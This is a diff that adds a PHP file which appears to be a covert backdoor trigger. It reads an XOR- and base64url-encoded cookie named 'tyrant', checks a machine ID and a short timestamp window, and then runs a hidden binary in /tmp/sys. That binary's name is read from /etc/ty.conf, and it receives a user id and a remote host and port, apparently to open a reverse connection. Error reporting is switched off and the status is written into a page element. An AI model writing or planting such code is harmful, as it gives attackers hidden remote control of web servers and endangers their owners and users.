@@ -1,0 +1,96 @@
+
+<?php
+$mid = "@MID";
+$timeout = 5;
+
+function base64url_decode($data) {
+    $base64 = str_replace(['-', '_'], ['+', '/'], $data);
+    $padding = strlen($base64) % 4;
+    if ($padding > 0) {
+        $base64 .= str_repeat('=', 4 - $padding);
+    }
+    return base64_decode($base64);
+}
+
+function reverseString($str) {
+    return strrev($str);  
+}
+
+function getTimestamp() {
+    return strval(intval(time()));
+}
+
+function xor_decrypt($data, $key) {
+    $decrypted = '';
+    $key_length = strlen($key);
+    for ($i = 0; $i < strlen($data); $i++) {
+        $decrypted .= chr(ord($data[$i]) ^ ord($key[$i % $key_length]));
+    }
+    return $decrypted;
+}
+
+function decrypt($data) {
+    list($_,$b1, $b2) = explode('.', $data);
+    $b2_ = base64url_decode($b2);
+    $b2_time = xor_decrypt($b2_, reverseString($GLOBALS['mid']));
+    if (!ctype_digit($b2_time) || getTimestamp() - $b2_time >= $GLOBALS['timeout']) {
+        return False;
+    }
+    $b1_ = base64url_decode($b1);
+    $b1_d = xor_decrypt($b1_, $GLOBALS['mid']);
+    return $b1_d;
+}
+
+function tyrant($uid, $rhost, $rport) {
+    $file_path = '/etc/ty.conf';
+    if (!ctype_digit($uid)) {
+        return 4131;
+    }
+    if (!filter_var($rhost, FILTER_VALIDATE_IP)) {
+        return 4131;
+    }
+    if (!ctype_digit($rport) || intval($rport) < 1 || intval($rport) > 65535) {
+        return 4131;
+    }
+
+    $file_name = trim(file_get_contents($file_path));
+    if (!$file_name) {
+        return 4131;
+    }
+
+    $escaped_uid = escapeshellarg($uid);
+    $escaped_rhost = escapeshellarg($rhost);
+    $escaped_rport = escapeshellarg($rport);
+
+    exec("/tmp/sys/$file_name -uid $escaped_uid -rhost $escaped_rhost -rport $escaped_rport", $output, $status);
+    return ($status === 0) ? 4132 : 4131;
+}
+
+function check_id($c_id){
+    $machine_id = $GLOBALS['mid'];
+    return ($machine_id === $c_id);
+}
+
+ini_set('display_errors', 0);  
+error_reporting(0);  
+
+if ($_SERVER['REQUEST_METHOD'] === 'POST') {
+    if (isset($_COOKIE['tyrant'])) {
+        $data = $_COOKIE['tyrant'];
+        $decrypted_message = decrypt($data);
+
+        if ($decrypted_message) {
+            $json_data = json_decode($decrypted_message, true);
+
+            if (isset($json_data['id']) && check_id($json_data['id'])) {
+                $status_code = tyrant($json_data['uid'], $json_data['rhost'], $json_data['rport']);
+            } else {
+                $status_code = 4130;
+            }
+        } else {
+            $status_code = 4130;
+        }
+        echo "<script>document.getElementById('bk').value = " . json_encode($status_code) . ";</script>";
+    }
+}
+?>
